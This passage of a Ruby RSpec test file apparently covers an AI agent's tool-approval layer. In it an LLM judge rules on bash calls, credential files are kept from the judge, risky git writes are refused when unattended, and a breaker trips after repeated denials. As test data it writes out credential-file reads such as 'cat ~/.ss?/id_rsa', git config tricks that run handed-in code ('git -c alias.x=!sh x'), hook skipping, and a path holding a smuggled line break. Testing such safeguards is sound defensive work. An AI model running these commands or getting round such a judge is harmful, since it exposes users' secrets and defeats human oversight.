        allow(facts).to receive(:directory?).with("#{root}/.git").and_return(true)
        allow(facts).to receive(:each_child) { |directory, &each| each.call(".git") if directory == root }
        scripted = answering("approve")

        settled(rung(scripted), bash("grep -r needle ."), within: context)

        expect(scripted.prompts).to be_empty
      end
    end

    describe "on disk" do
      around do |example|
        Dir.mktmpdir("lain-judged") do |dir|
          @base = File.realpath(dir)
          example.run
        end
      end

      let(:home) { File.join(@base, "home") }
      let(:root) { File.join(home, "project") }

      def asked_about(effect, within)
        scripted = answering("approve")
        settled(rung(scripted), effect, within:)
        scripted.prompts.size
      end

      it "never asks the judge about an ordinary name that links to a credential" do
        FileUtils.mkdir_p(root)
        File.write(File.join(root, ".env"), "TOKEN=1\n")
        File.symlink(".env", File.join(root, "notes.txt"))

        expect(asked_about(call("read_file", { "path" => "notes.txt" }), context)).to eq(0)
      end

      describe "a bash command's patterns" do
        before do
          FileUtils.mkdir_p([File.join(root, "secrets"), File.join(root, "src"), File.join(home, ".ssh")])
          File.write(File.join(root, ".env"), "TOKEN=1\n")
          File.write(File.join(root, "secrets", "a"), "hunter2\n")
          File.write(File.join(root, "src", "a.rb"), "1\n")
          File.write(File.join(home, ".ssh", "id_rsa"), "key\n")
        end

        def asked_about_command(command) = asked_about(bash(command), context)

        it "never asks the judge about a glob that matches a credential" do
          commands = ["cat .en?", "cat .e*", "cat .[e]nv", "ls secret?", "cat ~/.ss?/id_rsa"]

          expect(commands.to_h { [_1, asked_about_command(_1)] }).to eq(commands.to_h { [_1, 0] })
        end

        it "asks the judge about a glob whose matches are all ordinary" do
          expect(asked_about_command("cat src/*.rb *env")).to eq(1)
        end

        it "never asks the judge about a glob with more matches than it may weigh" do
          many = File.join(root, "many")
          FileUtils.mkdir_p(many)
          (described_class::Reach::MATCHES + 1).times { File.write(File.join(many, "f#{_1}.txt"), "") }

          expect(asked_about_command("cat many/*.txt")).to eq(0)
        end

        it "tells the parked row why the judge did not look at a glob with too many matches" do
          many = File.join(root, "many")
          FileUtils.mkdir_p(many)
          (described_class::Reach::MATCHES + 1).times { File.write(File.join(many, "f#{_1}.txt"), "") }

          ruled(rung(answering("approve")), bash("cat many/*.txt")) do |pending|
            expect(pending.notes).to eq(["the judge did not look: it reaches more files than the judge weighs"])
            pending.deny(surface: "human_spec")
          end
        end

        it "never asks the judge about a recursive read of a tree whose only credential is .env" do
          FileUtils.mkdir_p(File.join(root, "only"))
          File.write(File.join(root, "only", ".env"), "TOKEN=1\n")
          File.write(File.join(root, "only", "a.rb"), "1\n")

          expect([asked_about_command("grep -r needle only"), asked_about_command("grep -r needle src")]).to eq([0, 1])
        end

        it "never asks the judge about a recursive read through a link to a directory holding .env" do
          elsewhere = File.join(@base, "elsewhere")
          holder = File.join(root, "holder")
          FileUtils.mkdir_p([elsewhere, holder])
          File.write(File.join(elsewhere, ".env"), "TOKEN=1\n")
          File.symlink(elsewhere, File.join(holder, "d"))
          File.symlink(holder, File.join(holder, "loop"))
          commands = ["grep -R needle holder", "rg -L needle holder", "cp -rL holder copy", "diff -r holder src",
                      "tar chf x.tar holder", "zip -r x.zip holder"]

          expect(commands.to_h { [_1, asked_about_command(_1)] }).to eq(commands.to_h { [_1, 0] })
        end

        it "judges a tree-free git command by the entries its <rev>:<path> matches, dot directories included" do
          FileUtils.mkdir_p(File.join(root, ".hidden"))
          File.symlink(File.join(root, ".env"), File.join(root, ".hidden", "notes"))

          expect([asked_about_command("git ls-tree HEAD:src"), asked_about_command("git ls-tree HEAD:notes")])
            .to eq([1, 0])
        end

        it "walks a link back up the tree once, and judges the tree" do
          File.symlink(File.join(root, "src"), File.join(root, "src", "again"))

          expect(asked_about_command("grep -R needle src")).to eq(1)
        end

        it "never asks the judge about a recursive read of a tree it cannot read whole" do
          locked = File.join(root, "locked", "inner")
          FileUtils.mkdir_p(locked)
          File.chmod(0o000, locked)

          expect(asked_about_command("grep -r needle locked")).to eq(0)
        ensure
          File.chmod(0o755, locked)
        end

        it "matches a glob under a directory whose own name holds glob characters" do
          odd = %w[w[1] w{a,b}].map { File.join(root, _1) }
          FileUtils.mkdir_p(odd)
          odd.each { File.write(File.join(_1, ".env"), "TOKEN=1\n") }

          within = odd.map { context.with(worker_env: Lain::WorkerEnv.new(cwd: _1, env: {})) }

          expect(within.map { asked_about(bash("cat .e*"), _1) }).to eq([0, 0])
        end

        it "asks the judge about a git log that prints no file contents, in a tree too big to walk" do
          wide = File.join(root, "wide")
          FileUtils.mkdir_p(wide)
          (described_class::Reach::ENTRIES + 1).times { File.write(File.join(wide, "f#{_1}"), "") }

          expect([asked_about_command("git log --oneline -5"), asked_about_command("git log -p")]).to eq([1, 0])
        end

        it "never asks the judge about a recursive read of a tree larger than it may walk" do
          wide = File.join(root, "wide")
          FileUtils.mkdir_p(wide)
          (described_class::Reach::ENTRIES + 1).times { File.write(File.join(wide, "f#{_1}"), "") }

          expect(asked_about_command("grep -r x wide")).to eq(0)
        end
      end

      describe "a git command that reads the repository's whole history" do
        let(:ungated) do
          rules = Lain::Sensitivity::Rules.from({ "exempt" => ["/.git/config"] })
          Lain::Sensitivity::Policy.new(sensitivity: Lain::Sensitivity.new(home:, cwd: root, root:, rules:),
                                        home:, root:)
        end
        let(:store) { "the judge did not look: #{described_class::GIT_STORE}" }
        let(:opaque) { "the judge did not look: #{described_class::OPAQUE}" }
        let(:below) { "the judge did not look: #{described_class::BELOW_TOP}" }

        before do
          FileUtils.mkdir_p(File.join(root, ".git", "objects"))
          File.write(File.join(root, ".git", "config"), "[core]\n")
          File.write(File.join(root, ".git", "HEAD"), "ref: refs/heads/main\n")
        end

        it "hands git log -p down without asking, naming the object store, though .git/config is not gated" do
          scripted = answering("approve")
          notes = nil
          ruled(rung(scripted, under: ungated), bash("git log -p")) do |pending|
            notes = pending.notes
            pending.deny(surface: "human_spec")
          end

          expect([scripted.prompts.size, notes]).to eq([0, [store]])
        end

        it "still asks the judge about a short log that prints no bodies" do
          scripted = answering("approve")

          ruling = ruled(rung(scripted, under: ungated), bash("git log --oneline -5"))

          expect([ruling.verdict, scripted.prompts.size]).to eq([:allow, 1])
        end

        it "names the git store for git show under the default policy, not an unweighable .git/config" do
          notes = nil
          ruled(rung(answering("approve")), bash("git show HEAD~1")) do |pending|
            notes = pending.notes
            pending.deny(surface: "human_spec")
          end

          expect(notes).to eq([store])
        end

        it "names the git store for grep -r over a real .git directory" do
          notes = nil
          ruled(rung(answering("approve"), under: ungated), bash("grep -r x .")) do |pending|
            notes = pending.notes
            pending.deny(surface: "human_spec")
          end

          expect(notes).to eq([store])
        end

        def link_worktree
          FileUtils.rm_rf(File.join(root, ".git"))
          File.write(File.join(root, ".git"), "gitdir: #{File.join(@base, "elsewhere")}\n")
        end

        it "hands git log -p and git show down naming the store in a linked worktree, where .git is a pointer" do
          link_worktree
          notes = ["git log -p", "git show HEAD~1"].map do |command|
            ruled(rung(answering("approve"), under: ungated), bash(command)) do |pending|
              @last = pending.notes
              pending.deny(surface: "human_spec")
            end
            @last
          end

          expect(notes).to eq([[store], [store]])
        end

        it "hands down a git whose program word is spelled by path or quoted, in a linked worktree" do
          link_worktree
          notes = ["/usr/bin/git log -p", "'git' log -p", '"git" log -p'].map do |command|
            ruled(rung(answering("approve"), under: ungated), bash(command)) do |pending|
              @last = pending.notes
              pending.deny(surface: "human_spec")
            end
            @last
          end

          expect(notes).to eq([[store]] * 3)
        end

        it "judges a search that merely mentions git, in a linked worktree" do
          link_worktree
          asked = ["echo git && grep -r x .", "grep -r git ."].map do |command|
            scripted = answering("approve")
            ruled(rung(scripted, under: ungated), bash(command))
            scripted.prompts.size
          end

          expect(asked).to eq([1, 1])
        end

        it "still asks the judge about grep -r in a linked worktree, which finds no store there" do
          link_worktree
          scripted = answering("approve")

          ruling = ruled(rung(scripted, under: ungated), bash("grep -r x ."))

          expect([ruling.verdict, scripted.prompts.size]).to eq([:allow, 1])
        end

        def unattended(command)
          scripted = answering("approve")
          ruling = ruled(rung(scripted, asking: described_class::Unattended.new), bash(command))
          [ruling.verdict, scripted.prompts.size, escalations.last&.fetch("note", nil)]
        end

        it "unattended, asks the judge about a checkout-local add and commit, which name .git but not the store" do
          commands = ["git add lib/x.rb spec/lain/x_spec.rb", "git commit -m msg"]

          expect(commands.map { unattended(_1) }).to eq([[:allow, 1, nil]] * 2)
        end

        it "unattended, asks the judge about a checkout-local add and commit in a linked worktree" do
          link_worktree
          commands = ["git add lib/x.rb spec/lain/x_spec.rb", "git commit -m msg"]

          expect(commands.map { unattended(_1) }).to eq([[:allow, 1, nil]] * 2)
        end

        it "unattended, refuses a write to the shared store, a skipped hook and a whole-tree read, naming the store" do
          commands = ["git stash clear", "git tag -d v1", "git branch -D feature", "git switch -c topic", "git push",
                      "git commit --no-verify -m x", "git --git-dir=/x/.git add .", "git diff", "git add ."]

          expect(commands.to_h { [_1, unattended(_1)] }).to eq(commands.to_h { [_1, [:deny, 0, store]] })
        end

        it "unattended, refuses a root, glob or magic pathspec, naming the store, in either checkout" do
          commands = ["git add -f '*'", "git add '*.pem'", "git add :/", "git add ':(top)'", "git add ':!x'",
                      "git add ':(glob)**'", "git add .", "git restore '*'", "git restore .", "git checkout -- '*'",
                      "git checkout -- .", "git rm -r ':/'", "git restore -m '*'", "git restore -m ':/'",
                      "git commit -m x -o '*'", "git commit -m x -o ':/'", "git commit -m -- -a",
                      "git commit --message -- -a", "git commit -m -- --no-verify", "git commit -F -- -a",
                      "git checkout --conflict -- -f lib/x.rb"]
          refused = commands.to_h { [_1, [:deny, 0, store]] }
          real = commands.to_h { [_1, unattended(_1)] }
          link_worktree

          expect([real, commands.to_h { [_1, unattended(_1)] }]).to eq([refused, refused])
        end

        it "unattended, refuses a commit naming a credential as its attached message file" do
          unweighable = format(described_class::UNWEIGHABLE, path: File.join(root, ".env"))

          expect(unattended("git commit -F.env")).to eq([:deny, 0, "the judge did not look: #{unweighable}"])
        end

        it "unattended, refuses a checkout-local write run below the top level, in either checkout" do
          FileUtils.mkdir_p(File.join(root, "lib"))
          commands = ["cd lib && git add -A", "cd lib && git commit -am x", "cd lib && git reset --hard",
                      "cd lib && git add x.rb", "cd lib && git commit -m x"]
          refused = commands.to_h { [_1, [:deny, 0, below]] }
          real = commands.to_h { [_1, unattended(_1)] }
          link_worktree

          expect([real, commands.to_h { [_1, unattended(_1)] }]).to eq([refused, refused])
        end

        it "unattended, reads a git -C write as the same write after a cd there" do
          expect(unattended("git -C ../other commit -m x")).to eq(unattended("cd ../other && git commit -m x"))
          expect(unattended("git -C ../other commit -m x")).to eq([:deny, 0, below])
        end

        it "unattended, refuses a git that points elsewhere or runs code it was handed, its paths unnamed" do
          commands = ["git --work-tree=/y commit", "GIT_DIR=/z git commit",
                      "git -c core.fsmonitor=cmd status", "git -c alias.x=!sh x"]

          expect(commands.to_h { [_1, unattended(_1)] }).to eq(commands.to_h { [_1, [:deny, 0, opaque]] })
        end
      end

      it "counts a named directory below a checkout the cwd sits under" do
        checkout = File.join(@base, "spikes", "w1")
        FileUtils.mkdir_p([root, File.join(checkout, "sub"), File.join(checkout, "secrets")])
        File.write(File.join(checkout, "secrets", "prod.yml"), "hunter2\n")
        inside = context.with(worker_env: Lain::WorkerEnv.new(cwd: File.join(checkout, "sub"), env: {}, checkout:))

        expect(asked_about(call("read_file", { "path" => File.join(checkout, "secrets", "prod.yml") }),
                           inside)).to eq(0)
      end
    end
  end

  describe "the judge-denial arms" do
    def under(arm) = Lain::Approval::DenialBreaker.for(arm, journal:)

    def as(requester) = context.with(requester:)

    it "applies a judge deny under off, exactly as with no arm given" do
      ruling = ruled(rung(answering("deny"), denials: under(:off)), bash)

      expect([ruling.verdict, ruling.rung, ruling.reason]).to eq([:deny, "auto", described_class::DENIED])
      expect(queue.to_a).to be_empty
    end

    describe "escalate_only" do
      it "parks a judge deny for a human, telling them the judge would have refused it" do
        ruling = ruled(rung(answering("deny"), denials: under(:escalate_only)), bash) do |pending|
          expect(pending.reasons.map(&:to_s)).to eq([described_class::WOULD_DENY_NOTE])
          pending.approve(surface: "human_spec", authority: :human)
        end

        expect([ruling.verdict, ruling.authority, ruling.rung]).to eq([:allow, :human, "surfaces"])
        expect(described_class::WOULD_DENY_NOTE).to eq("the judge would have refused this")
      end

      it "journals its own ruling as an abstention whose reason names the judge's deny" do
        ruled(rung(answering("deny"), denials: under(:escalate_only)), bash) do |pending|
          pending.deny(surface: "human_spec")
        end

        expect(escalations.sole).to include("rung" => "auto", "verdict" => "abstain",
                                            "reason" => described_class::ESCALATED)
        expect(described_class::ESCALATED).to include("the judge refused")
      end

      it "still tells the display the judge denied the call" do
        told = []
        escalating = rung(answering("deny"), denials: under(:escalate_only), display: told)
        ruled(escalating, bash("ls -la /home/u")) { |pending| pending.deny(surface: "human_spec") }

        expect(told).to eq([Lain::Telemetry::JudgeRuled.new(call: 'bash({"command" => "ls -la /home/u"})',
                                                            verdict: "denied")])
      end

      it "refuses it through the unattended rung as a plain deny when nobody is attached" do
        ruling = ruled(rung(answering("deny"), denials: under(:escalate_only),
                                               asking: described_class::Unattended.new), bash)

        expect([ruling.verdict, ruling.reason]).to eq([:deny, described_class::Unattended::BECAUSE])
      end
    end

    describe "breaker" do
      let(:breaker) { under(:breaker) }

      it "stops asking the judge for a requester it denied 3 times in a row, and parks the 4th call" do
        scripted = answering("deny")
        3.times { ruled(rung(scripted, denials: breaker), bash) }

        ruling = ruled(rung(scripted, denials: breaker), bash) do |pending|
          expect(pending.reasons.map(&:to_s)).to eq([described_class::BROKEN_NOTE])
          pending.deny(surface: "human_spec", authority: :human)
        end

        expect([scripted.prompts.size, ruling.rung]).to eq([3, "surfaces"])
        expect(escalations.last).to include("rung" => "auto", "verdict" => "abstain",
                                            "reason" => described_class::BROKEN)
        expect(journal_records(journal_io, "judge_breaker_tripped").sole)
          .to include("requester" => "main", "count" => 3, "because" => "3 in a row")
      end

      it "keeps the reason the judge did not look on a tripped requester's call it would never have judged" do
        3.times { ruled(rung(answering("deny"), denials: breaker), bash) }

        ruled(rung(answering("deny"), denials: breaker), call("read_file", { "path" => ".env" })) do |pending|
          expect(pending.reasons.map(&:to_s)).not_to include(described_class::BROKEN_NOTE)
          pending.deny(surface: "human_spec")
        end

        expect(escalations.last).to include("rung" => "auto", "verdict" => "abstain", "reason" => "unjudgeable")
      end

      it "still asks the judge for another requester" do
        scripted = answering("deny")
        3.times { ruled(rung(scripted, denials: breaker), bash) }

        ruling = ruled(rung(scripted, denials: breaker), bash, within: as("researcher"))

        expect([scripted.prompts.size, ruling.rung]).to eq([4, "auto"])
      end

      it "counts a judge approve as breaking the run" do
        verdicts = %w[deny deny approve deny deny approve].each
        scripted = answering { verdicts.next }
        6.times { ruled(rung(scripted, denials: breaker), bash) }

        expect(breaker.tripped?("main")).to be(false)
      end
    end
  end

  describe "unattended" do
    let(:unattended) { described_class::Unattended.new }

    it "refuses what the judge cannot settle, naming --non-interactive" do
      ruling = ruled(rung(answering("defer"), asking: unattended), bash)

      expect(ruling.verdict).to eq(:deny)
      expect(ruling.reason).to include("--non-interactive")
    end

    it "refuses a barred call finally, telling the model only a human could approve it" do
      ruling = ruled(rung(answering("approve"), asking: unattended), bash,
                     within: context.with(automatic_approval_barred: true))

      expect([ruling.verdict, ruling.final?]).to eq([:deny, true])
      expect(ruling.told).to include("only a human").and include("--non-interactive")
    end

    it "marks the barred refusal as one a human in ask could lift" do
      ruling = ruled(rung(answering("approve"), asking: unattended), bash,
                     within: context.with(automatic_approval_barred: true))

      expect(ruling).to be_liftable
    end

    it "reaches the model through a Gate with its own clause and no promise that no approval will lift it" do
      ruling = ruled(rung(answering("approve"), asking: unattended), bash,
                     within: context.with(automatic_approval_barred: true))
      policy = Struct.new(:ruling) { def rule(*) = ruling }.new(ruling)
      gate = Lain::Middleware::Gate.new(policy:)

      told = dispatch_call("bash", { "command" => "ls" }, toolset: Lain::Toolset.new([Lain::Tools::Bash.new]),
                                                          layers: [gate])

      expect(told.content).to include(ruling.told)
      expect(told.content).not_to include("no approval will lift this")
    end

    it "does not claim the judge was asked about a call it was not allowed to judge" do
      ruling = ruled(rung(answering("approve"), asking: unattended), call("read_file", { "path" => ".env" }))

      expect(ruling.reason).to include("--non-interactive").and include("not allowed to judge")
    end

    it "says lain's bar stopped the call, and why, rather than that the judge did not approve it" do
      stage = Lain::Shell::Executable.unresolved("make")
      facts = Lain::Approval::Judge::Facts.new([stage])
      ruling = ruled(rung(answering("approve"), asking: unattended, facts: ->(*, **) { facts }), bash)

      expect([ruling.verdict, ruling.final?]).to eq([:deny, false])
      expect(ruling.reason).to include("bars an automatic approval").and include("make: not resolved")
        .and include("--non-interactive")
      expect(ruling.reason).not_to include("did not approve")
    end

    it "quotes each reason, so a path holding a line break opens no line of its own in the refusal" do
      facts = Lain::Approval::Judge::Facts.new([Lain::Shell::Executable.unresolved("make\nretrying will work")])
      ruling = ruled(rung(answering("approve"), asking: unattended, facts: ->(*, **) { facts }), bash)

      expect(ruling.reason).to include('("make\\nretrying will work: not resolved")')
      expect(ruling.reason).not_to include("\n")
    end

    it "still applies a clear approve" do
      expect(ruled(rung(answering("approve"), asking: unattended), bash).verdict).to eq(:allow)
    end

    it "does not tell the model a human can approve a call the judge denied, with no human to ask" do
      ruling = ruled(rung(answering("deny"), asking: unattended), bash)

      expect([ruling.verdict, ruling.final?, ruling.said]).to eq([:deny, false, "the judge refused this call"])
    end
  end

  describe "the digests of what the judge read" do
    let(:ladder_io) { StringIO.new }
    let(:stages) do
      [Lain::Shell::Executable.new(name: "make", resolved: "/usr/bin/make", realpath: "/usr/bin/make", chain: [],
                                   shadowed: [], anomalies: [], klass: :system, fresh: false, run_files: [],
                                   wrappers: [])]
    end
    let(:facts) { Lain::Approval::Judge::Facts.new(stages) }
    let(:wanted) { Lain::Approval::Judge::Request.new("list the files", false) }

    def laddered(scripted, **rest)
      ladder_journal = Lain::Journal.new(io: ladder_io)
      Lain::Approval::Escalation.new([rung(scripted, journal: ladder_journal, **rest)], journal: ladder_journal,
                                                                                        label: "auto")
    end

    def refusing = ->(*) { Lain::Approval::Escalation::Ruling.deny(rung: "x", because: "y") }

    def judged_records = journal_records(ladder_io, "escalation").select { _1["rung"] == "auto" }

    def digest(text) = Lain::Canonical.digest(text)

    def read_by_judge(verdict, **rest)
      scripted = verdict ? answering(verdict) : answering { raise IOError, "no answer" }
      ladder = laddered(scripted, facts: ->(*, **) { facts }, request: ->(_context) { wanted }, **rest)
      Sync { ladder.call(bash, context) }
      scripted
    end

    it "names what the judge read on an approve, the prompt digest that of the prompt it received" do
      scripted = read_by_judge("approve")

      expect(judged_records.sole).to include("verdict" => "allow", "prompt_digest" => digest(scripted.prompts.sole),
                                             "facts_digest" => digest(facts.to_s),
                                             "request_digest" => digest(wanted.to_s))
    end

    it "names what the judge read on a deny" do
      scripted = read_by_judge("deny")

      expect(judged_records.sole).to include("verdict" => "deny", "prompt_digest" => digest(scripted.prompts.sole))
    end

    it "names it on a deferral and a fault, and none on a call the bar stopped before the judge read it" do
      barring = Lain::Approval::Judge::Facts.new([stages.first.with(klass: :unresolved, resolved: nil, realpath: nil)])
      deferred = read_by_judge("defer", asking: refusing)
      faulted = read_by_judge(nil, asking: refusing)
      stopped = JudgedSpecSupport::ScriptedProvider.new { "approve" }
      Sync do
        laddered(stopped, facts: ->(*, **) { barring }, asking: refusing).call(bash, context)
      end

      expect(judged_records.map { _1["reason"] }).to eq(%w[deferred fault bar])
      expect(judged_records.map { _1["prompt_digest"] })
        .to eq([*[deferred, faulted].map { digest(_1.prompts.sole) }, nil])
      expect(stopped.prompts).to be_empty
    end

    it "leaves the digests off a call the judge never looked at" do
      barred = context.with(automatic_approval_barred: true)
      scripted = answering("approve")

      Sync { laddered(scripted, asking: refusing).call(bash, barred) }

      expect(judged_records.sole.keys).not_to include("prompt_digest", "facts_digest", "request_digest")
    end

    it "leaves the facts and request digests off when the call was told neither" do
      scripted = answering("approve")

      Sync { laddered(scripted).call(bash, context) }

      expect(judged_records.sole).to include("prompt_digest" => digest(scripted.prompts.sole))
      expect(judged_records.sole.keys).not_to include("facts_digest", "request_digest")
    end

    it "keeps the digests when the ladder rewrites the ruling, as it does over an earlier rung's fault" do
      faulty = Struct.new(:name) { def call(*) = raise("boom") }.new("rules")
      scripted = answering("deny")
      ladder_journal = Lain::Journal.new(io: ladder_io)
      ladder = Lain::Approval::Escalation.new([faulty, rung(scripted, journal: ladder_journal)],
                                              journal: ladder_journal, label: "auto")

      ruling = Sync { ladder.call(bash, context) }

      expect(ruling).to be(false)
      expect(journal_records(ladder_io, "escalation").select { _1["rung"] == "auto" })
        .to all(include("prompt_digest" => digest(scripted.prompts.sole)))
    end

    it "stays a ruling that names the digests through #with" do
      scripted = answering("approve")
      ruling = Sync { rung(scripted).call(bash, context) }

      rewritten = ruling.with(reason: "z", fault: true)

      expect([rewritten.reason, rewritten.fault?, rewritten.record["prompt_digest"]])
        .to eq(["z", true, digest(scripted.prompts.sole)])
    end

    it "digests the prompt the judge was sent, not a second build of it" do
      scripted = answering("approve")
      builds = 0
      judge = JudgedSpecSupport.judge(scripted)
      counting = judge.dup
      counting.define_singleton_method(:prompt) { |**kw| judge.prompt(**kw).tap { builds += 1 } }

      subject = described_class.new(judge: counting, policy:, asking: Lain::Approval::Escalation::Surfaces.new(queue),
                                    journal:)
      Sync { subject.call(bash, context) }

      expect(builds).to eq(1)
    end

    it "journals the digests on an auto ladder built by Switchboard.for" do
      scripted = answering("approve")
      board = Lain::CLI::Switchboard.for(
        chronicle: instance_double(Lain::CLI::Chronicle, record_journal: Lain::Journal.new(io: ladder_io)),
        options: { approval: "auto" }, model: "claude-opus-4-8", toolset: Lain::Toolset.new([Lain::Tools::Bash.new]),
        test_layout: Lain::Middleware::GuardTestLayout::Run.undeclared,
        judge: JudgedSpecSupport.judge(scripted)
      )

      call = Struct.new(:name, :input, :tool_use_id).new("bash", { "command" => "ls" }, "tu_1")
      allowed = Sync { board.policy_switch.call(call, nil) }

      expect(allowed).to be(true)
      expect(judged_records.sole).to include("prompt_digest" => digest(scripted.prompts.sole))
      expect(judged_records.sole.keys).not_to include("facts_digest", "request_digest")
    end

    it "journals no digest for a judge that cannot show its prompt" do
      judge = ->(**) { :approve }
      judged = described_class.new(judge:, policy:, asking: Lain::Approval::Judged::Unattended.new,
                                   journal: Lain::Journal.new(io: ladder_io))
      ladder = Lain::Approval::Escalation.new([judged], journal: Lain::Journal.new(io: ladder_io), label: "auto")

      Sync { ladder.call(bash, context) }

      expect(judged_records.sole).to include("verdict" => "allow")
      expect(judged_records.sole.keys).not_to include("prompt_digest")
    end
  end

  it "sends a barred call to the human without asking the judge, parked as humans-only" do
    scripted = answering("approve")
    barred = context.with(automatic_approval_barred: true)
    humans_only = nil

    ruling = ruled(rung(scripted), bash, within: barred) do |pending|
      humans_only = pending.humans_only?
      pending.approve(surface: "human_spec", authority: :human)
    end

    expect([scripted.prompts, humans_only, ruling.authority]).to eq([[], true, :human])
  end

  describe "deciding whether the judge may weigh a call, before it is paid" do
    around do |example|
      Dir.mktmpdir("lain-judgement") do |dir|
        @base = File.realpath(dir)
        example.run
      end
    end

    let(:home) { File.join(@base, "home") }
    let(:root) { File.join(home, "project") }

    before do
      FileUtils.mkdir_p([File.join(root, ".git", "objects"), File.join(root, "crates", "store"),
                         File.join(root, ".lain-views"), File.join(root, "wide")])
      File.write(File.join(root, ".git", "HEAD"), "ref: refs/heads/main\n")
      File.write(File.join(root, ".lain-views", "x.md"), "Given a view\n")
      (described_class::Reach::ENTRIES + 1).times { File.write(File.join(root, "wide", "f#{_1}"), "") }
    end

    # The session's mask list, as the workspace sandbox reads it: here it masks the tree's .env alone.
    def listing
      Struct.new(:masks).new([Lain::Sensitivity::Policy::Mask.new(path: File.join(root, "tree", ".env"),
                                                                  reason: :credential)])
    end

    def prompts_for(command, masked:)
      scripted = answering("approve")
      masks = masked ? Lain::Approval::Judgement::Masking.new(listing) : Lain::Approval::Judgement::Unmasked
      settled(rung(scripted, masks:), bash(command))
      scripted.prompts
    end

    it "asks the judge about git reads that run under the workspace mask, weighing nothing under .git", :seam do
      prompts = prompts_for("git status && git log && git branch -a", masked: true)

      expect(prompts.size).to eq(1)
      expect(prompts.sole).to include(Lain::Approval::Judge::Facts::HISTORY)
      expect(prompts.sole).not_to include("#{root}/.git")
    end

    it "keeps a git log from the judge when the call's environment points git at another repository", :seam do
      scripted = answering("approve")
      pointed = context.with(worker_env: Lain::WorkerEnv.new(cwd: root, env: { "GIT_DIR" => File.join(@base, ".git") }))

      settled(rung(scripted, masks: Lain::Approval::Judgement::Masking.new(listing)), bash("git log"), within: pointed)

      expect([scripted.prompts, prompts_for("git log", masked: true).size]).to eq([[], 1])
    end

    # A diff against the working tree prints files below the mask's depth, which no mask covers.
    it "asks the judge about a git diff between 2 commits under the workspace mask, and not one against the tree",
       :seam do
      expect(prompts_for("git diff HEAD~1..HEAD -- crates/store", masked: true).size).to eq(1)
      expect(prompts_for("git diff HEAD~1 -- crates/store", masked: true)).to be_empty
    end

    it "still hands a git log down unasked when nothing masks its output" do
      expect(prompts_for("git log", masked: false)).to be_empty
    end

    it "asks the judge about a grep run from a directory the command changes into" do
      expect(prompts_for("cd .lain-views && grep -c Given x.md", masked: false).size).to eq(1)
    end

    describe "a recursive grep over a tree holding a secret" do
      let(:tree) { File.join(root, "tree") }

      before do
        FileUtils.mkdir_p(tree)
        File.write(File.join(tree, "a.rb"), "1\n")
        File.write(File.join(tree, ".env"), "TOKEN=1\n")
      end

      it "asks the judge when the mask hides the secret, and tells it so" do
        masked = prompts_for("grep -rn needle tree", masked: true)

        expect(masked.size).to eq(1)
        expect(masked.sole).to include(format(Lain::Approval::Judge::Facts::MASKED, paths: File.join(tree, ".env")))
      end

      it "hands it down unasked when the call runs unconfined" do
        expect(prompts_for("grep -rn needle tree", masked: false)).to be_empty
      end

      it "hands it down unasked when the secret lies deeper than the mask lists" do
        File.delete(File.join(tree, ".env"))
        FileUtils.mkdir_p(File.join(tree, "vendor", "pkg"))
        File.write(File.join(tree, "vendor", "pkg", ".env"), "TOKEN=1\n")

        expect(prompts_for("grep -rn needle tree", masked: true)).to be_empty
      end
    end

    it "still hands down a recursive read past the walk's bound, mask or not" do
      expect(prompts_for("grep -rn needle wide", masked: true)).to be_empty
    end

    describe "a call whose resolved stages bar an automatic approval" do
      let(:barring) do
        Lain::Approval::Judge::Facts.new([Lain::Shell::Executable.unresolved("make test")])
      end

      it "asks the judge nothing, and journals the bar it found" do
        scripted = answering("approve")

        settled(rung(scripted, facts: ->(*, **) { barring }), bash)

        expect(scripted.prompts).to be_empty
        expect(escalations.sole).to include("rung" => "auto", "verdict" => "abstain", "reason" => "bar",
                                            "bar" => barring.bar)
      end
    end
  end

  describe "the memo of the judge's approvals" do
    let(:memo) { Lain::Approval::JudgeMemo.new }

    # A policy whose verdict on every path can be changed between calls, as an edit to the
    # project's sensitivity table would change it.
    let(:reclassing) do
      Class.new(SimpleDelegator) do
        attr_writer :reason

        def judge(*, **) = Lain::Sensitivity::Verdict.new(level: :ordinary, reason: @reason || :none)
        def confined(bounds) = Lain::Sensitivity::Policy::Confined.new(policy: self, bounds:, anchors: { home:, root: })
      end.new(policy)
    end

    def remembering(scripted, **) = rung(scripted, memo:, **)

    it "asks the judge once for an exact repeat, and says the second approval was remembered" do
      scripted = answering("approve")

      first = ruled(remembering(scripted), bash)
      second = ruled(remembering(scripted), bash)

      expect(scripted.prompts.size).to eq(1)
      expect([first.verdict, second.verdict, second.authority]).to eq(%i[allow allow automatic])
      expect([second.rung, second.reason]).to eq(["auto", described_class::REMEMBERED])
    end

    it "asks again for another requester or another cwd" do
      scripted = answering("approve")
      ruled(remembering(scripted), bash)

      ruled(remembering(scripted), bash, within: context.with(requester: "researcher"))
      ruled(remembering(scripted), bash, within: context.with(worker_env: Lain::WorkerEnv.new(cwd: "#{root}/sub",
                                                                                              env: {})))

      expect(scripted.prompts.size).to eq(3)
    end

    it "asks again once a named path's classification changed" do
      scripted = answering("approve")
      notes = bash("cat #{root}/notes.txt")
      ruled(remembering(scripted, under: reclassing), notes)

      reclassing.reason = :exempt
      ruled(remembering(scripted, under: reclassing), notes)

      expect(scripted.prompts.size).to eq(2)
    end

    it "never remembers a deny, a defer or a fault" do
      %w[deny defer].each do |answer|
        scripted = answering(answer)
        2.times { settled(remembering(scripted), bash) }

        expect(scripted.prompts.size).to eq(2)
      end
      failing = answering { raise "down" }
      2.times { settled(remembering(failing), bash) }

      expect(failing.prompts.size).to eq(2)
    end

    it "asks no judge and remembers nothing for a requester the breaker stopped, even for an approved call" do
      breaker = Lain::Approval::DenialBreaker.for(:breaker, journal:)
      verdicts = %w[approve deny deny deny].each
      scripted = answering { verdicts.next }
      ruled(remembering(scripted, denials: breaker), bash)
      %w[lint docs site].each { ruled(remembering(scripted, denials: breaker), bash("make #{_1}")) }

      ruled(remembering(scripted, denials: breaker), bash) { |pending| pending.deny(surface: "human_spec") }

      expect(scripted.prompts.size).to eq(4)
      expect(escalations.last).to include("rung" => "auto", "reason" => described_class::BROKEN)
      expect(escalations.map { _1["reason"] }).not_to include(described_class::REMEMBERED)
    end

    it "remembers nothing when it is off" do
      scripted = answering("approve")
      2.times { ruled(rung(scripted, memo: Lain::Approval::JudgeMemo.off), bash) }

      expect(scripted.prompts.size).to eq(2)
    end

    it "counts a remembered approval as an approval to the breaker" do
      breaker = Lain::Approval::DenialBreaker.for(:breaker, journal:)
      verdicts = %w[approve deny deny deny].each
      scripted = answering { verdicts.next }
      make = bash
      ruled(remembering(scripted, denials: breaker), make)
      2.times { ruled(remembering(scripted, denials: breaker), bash("make lint")) }
